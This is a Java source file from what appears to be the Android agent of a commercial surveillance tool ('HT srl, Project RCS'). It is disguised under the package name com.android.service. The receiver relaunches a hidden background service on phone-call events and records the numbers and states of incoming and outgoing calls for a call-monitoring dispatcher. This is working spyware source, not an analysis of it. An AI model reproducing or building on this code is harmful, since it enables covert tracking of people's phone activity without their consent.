/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.android.service.Call;
import com.android.service.Core;
import com.android.service.ServiceCore;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class BroadcastMonitorCall extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Call call;
		
		if (Core.isServiceRunning() == false) {
			Intent serviceIntent = new Intent(context, ServiceCore.class);
			
		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
		    context.startService(serviceIntent);
			
		    if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
			}
		    
			return;
		}

		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}

		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

			// Outgoing phone call
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 1");//$NON-NLS-1$
			}

			call = new Call(number, Call.OUTGOING, Call.START);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
			final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

			// Phone is ringing
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 2");//$NON-NLS-1$
			}

			call = new Call(number, Call.INCOMING, Call.START);
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
			// Call disconnected
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 3");//$NON-NLS-1$
			}

			call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
		} else if (intent.getStringExtra(TelephonyManager.EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
			// Call answered, or issuing new outgoing call
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): 4");//$NON-NLS-1$
			}

			call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): default");//$NON-NLS-1$
			}

			call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
		}

		// Caller/Callee number, incoming?/outgoing, in progress?/disconnected
		ListenerCall.self().dispatch(call);
	}
}
